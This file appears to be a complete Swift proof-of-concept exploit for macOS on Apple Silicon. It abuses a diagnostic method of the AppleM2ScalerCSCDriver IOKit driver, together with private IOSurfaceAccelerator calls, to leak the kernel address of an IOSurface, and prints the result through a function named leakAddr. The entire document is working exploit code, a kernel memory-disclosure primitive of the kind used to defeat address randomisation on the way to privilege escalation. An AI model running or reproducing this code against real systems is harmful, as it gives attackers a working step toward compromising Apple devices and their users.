import Darwin
import Foundation
import IOKit
import IOSurface

private let entrySize = 0x7c
private let headerSize = 0x20
private let outputSize = 0x8b820

private struct Record: Hashable {
    let line: UInt16
    let timestamp: UInt64
    let event: UInt32
    let payload: UInt64
}

private func error(_ text: String) -> NSError {
    NSError(domain: "PoC", code: 1, userInfo: [NSLocalizedDescriptionKey: text])
}

private func check(_ result: kern_return_t, _ operation: String) throws {
    guard result == KERN_SUCCESS else {
        throw error(String(format: "%@: 0x%08x", operation, UInt32(bitPattern: result)))
    }
}

private func read<T: FixedWidthInteger>(_ pointer: UnsafeRawPointer, _ offset: Int) -> T {
    var value: T = 0
    memcpy(&value, pointer.advanced(by: offset), MemoryLayout<T>.size)
    return T(littleEndian: value)
}

private func openDiagnosticClient() throws -> io_connect_t {
    guard let matching = IOServiceMatching("AppleM2ScalerCSCDriver") else {
        throw error("IOServiceMatching failed")
    }
    let service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
    guard service != IO_OBJECT_NULL else { throw error("driver not found") }
    defer { IOObjectRelease(service) }

    var connection: io_connect_t = IO_OBJECT_NULL
    try check(IOServiceOpen(service, mach_task_self_, 0, &connection), "IOServiceOpen")
    return connection
}

private func snapshot(_ connection: io_connect_t) throws -> Set<Record> {
    let output = UnsafeMutableRawPointer.allocate(byteCount: outputSize, alignment: 0x4000)
    defer { output.deallocate() }
    output.initializeMemory(as: UInt8.self, repeating: 0, count: outputSize)

    var request = UInt64(UInt(bitPattern: output))
    let result = withUnsafeBytes(of: &request) {
        IOConnectCallStructMethod(connection, 8, $0.baseAddress, $0.count, nil, nil)
    }
    try check(result, "get_iosaDiag")

    let count = Int(read(output, 0x14) as UInt16) + Int(read(output, 0x16) as UInt16)
    guard count <= (outputSize - headerSize) / entrySize else {
        throw error("invalid diagnostic entry count")
    }

    var records = Set<Record>()
    for index in 0..<count {
        let entry = headerSize + index * entrySize
        guard output.load(fromByteOffset: entry, as: UInt8.self) != 0 else { continue }
        records.insert(Record(
            line: read(output, entry + 0x02),
            timestamp: read(output, entry + 0x04),
            event: read(output, entry + 0x14),
            payload: read(output, entry + 0x18)
        ))
    }
    return records
}

private func scratchSurface(like source: IOSurfaceRef) throws -> IOSurfaceRef {
    var properties: [CFString: Any] = [
        kIOSurfaceWidth: IOSurfaceGetWidth(source),
        kIOSurfaceHeight: IOSurfaceGetHeight(source),
        kIOSurfaceAllocSize: IOSurfaceGetAllocSize(source),
        kIOSurfacePixelFormat: IOSurfaceGetPixelFormat(source),
    ]

    if let planes = IOSurfaceCopyValue(source, kIOSurfacePlaneInfo) {
        properties[kIOSurfacePlaneInfo] = planes
    } else {
        properties[kIOSurfaceBytesPerElement] = IOSurfaceGetBytesPerElement(source)
        properties[kIOSurfaceBytesPerRow] = IOSurfaceGetBytesPerRow(source)
    }

    guard let surface = IOSurfaceCreate(properties as CFDictionary) else {
        throw error("failed to create scratch IOSurface")
    }
    return surface
}

private typealias AcceleratorCreate = @convention(c) (
    UnsafeRawPointer?, UInt32, UnsafeMutablePointer<UnsafeMutableRawPointer?>
) -> kern_return_t

private typealias AcceleratorTransfer = @convention(c) (
    UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?,
    UnsafeRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?
) -> kern_return_t

func leakAddr(surfaceID: IOSurfaceID) throws -> UInt64 {
    guard let source = IOSurfaceLookup(surfaceID) else {
        throw error("IOSurfaceLookup failed")
    }

    let connection = try openDiagnosticClient()
    defer { IOServiceClose(connection) }

    let path = "/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator"
    guard let library = dlopen(path, RTLD_NOW | RTLD_LOCAL) else {
        throw error("failed to load IOSurfaceAccelerator")
    }
    defer { dlclose(library) }

    guard let createSymbol = dlsym(library, "IOSurfaceAcceleratorCreate"),
          let transferSymbol = dlsym(library, "IOSurfaceAcceleratorTransferSurface") else {
        throw error("IOSurfaceAccelerator symbols not found")
    }

    let create = unsafeBitCast(createSymbol, to: AcceleratorCreate.self)
    let transfer = unsafeBitCast(transferSymbol, to: AcceleratorTransfer.self)
    var accelerator: UnsafeMutableRawPointer?
    try check(create(nil, 0, &accelerator), "IOSurfaceAcceleratorCreate")
    guard let accelerator else { throw error("accelerator is null") }
    defer { Unmanaged<AnyObject>.fromOpaque(accelerator).release() }

    let destination = try scratchSurface(like: source)
    let before = try snapshot(connection)
    try check(transfer(
        accelerator,
        Unmanaged.passUnretained(source).toOpaque(),
        Unmanaged.passUnretained(destination).toOpaque(),
        nil, nil, nil
    ), "IOSurfaceAcceleratorTransferSurface")

    let candidates = try snapshot(connection).subtracting(before).filter {
        $0.event == 0x10e && $0.line == 0x100c &&
        ($0.payload & 0x00ff_0000_0000_0000) == 0x00ff_0000_0000_0000
    }
    guard candidates.count == 1, let address = candidates.first?.payload else {
        throw error("failed to correlate the source IOSurface")
    }
    return address
}

private func makeSurface() throws -> IOSurfaceRef {
    let properties: [CFString: Any] = [
        kIOSurfaceWidth: 64,
        kIOSurfaceHeight: 64,
        kIOSurfaceBytesPerElement: 4,
        kIOSurfaceBytesPerRow: 256,
        kIOSurfaceAllocSize: 0x4000,
        kIOSurfacePixelFormat: UInt32(0x4247_5241), // BGRA
    ]
    guard let surface = IOSurfaceCreate(properties as CFDictionary) else {
        throw error("IOSurfaceCreate failed")
    }
    return surface
}

do {
    let surface = try makeSurface()
    let sid = IOSurfaceGetID(surface)

    let address = try leakAddr(surfaceID: sid)
    print(String(format: "IOSurface[%d]: %#018llx", sid, address))

    withExtendedLifetime(surface) {}
} catch {
    fputs("error: \(error.localizedDescription)\n", stderr)
    exit(1)
}
